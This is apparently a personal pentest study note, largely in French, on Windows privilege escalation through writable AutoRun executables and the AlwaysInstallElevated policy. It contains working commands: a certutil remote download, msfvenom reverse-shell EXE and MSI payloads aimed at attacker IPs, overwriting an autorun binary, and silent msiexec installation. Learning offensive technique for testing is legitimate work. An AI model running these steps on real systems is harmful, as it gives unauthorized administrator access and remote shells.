This is my learning about windows Privilege Escalation
## Weak Registry Autoruns Escalation
Windows peut être configuré pour exécuter des commandes au démarrage, ce processus est appelé AutoRun. Ces exécutions automatiques sont configurées dans le registre. Si vous êtes en mesure d'écrire dans un exécutable AutoRun et de redémarrer le système (ou d'attendre qu'il soit redémarré), vous pouvez être en mesure d'élever vos privilèges.

Pour cela utilisons winpeas pour voir s'il ya des programmes qui ont un droit de autorun
```
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
.\winPEASany.exe quiet applicationsinfo
```
trouver un program d'autorun  qui es le program.exe dans `C:\Program Files\Autorun Program\program.exe`

Si nous souhaitons effectuer l'énumération manuellement, il suffit d'utiliser la commande ci-dessous :
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
Pour vérifier la permission du programme.exe, nous utiliserons accesschk.exe.

```
.\accesschk.exe /accepteula -wvu "Program path"
```
Maintenant pour l'exploiter on doit creer un program avec le meme nom que program.exe avec notre listner
```
msfvenom -p windows/shell_reverse_tcp lhost=10.4.5.83 lport=53 -f exe > shell.exe
```
copy it to program.exe
```
copy /Y shell.exe "C:\Program Files\Autorun Program\program.exe"
```

## AlwaysInstallElevated
 Dans les tests de pénétration, lorsque nous lançons un shell de commande en tant qu'utilisateur local, il est possible d'exploiter les fonctions vulnérables (ou les paramètres de configuration) de la stratégie de groupe de Windows, afin de les élever aux privilèges d'administrateur et d'obtenir l'accès d'administrateur.
 Comme nous le savons tous, le système d'exploitation Windows est doté d'un moteur Windows Installer qui est utilisé par les paquets MSI pour l'installation d'applications. Ces paquets MSI peuvent être installés avec des privilèges élevés pour les utilisateurs non administrateurs.
**Detection**
Pour detecter cela il suffit
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
Comme nous pouvons le voir dans la sortie, le registre nommé "AlwaysInstallElevated" existe avec une valeur dword (REG_WORD) de 0x1, ce qui signifie que la stratégie AlwaysInstallElevated est activée.

- Privilege Escalation via .msi payload 
La premiere methode est de creer un payload en `.msi` ensuite l'executer avec `msiexec /quiet /qn /i`
/quiet = Supprime tout message à l'utilisateur pendant l'installation
/qn = Pas d'interface graphique
/i = Installation normale (vs. administrative)
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 -f msi > shell.msi

msiexec /quiet /qn /i shell.msi
```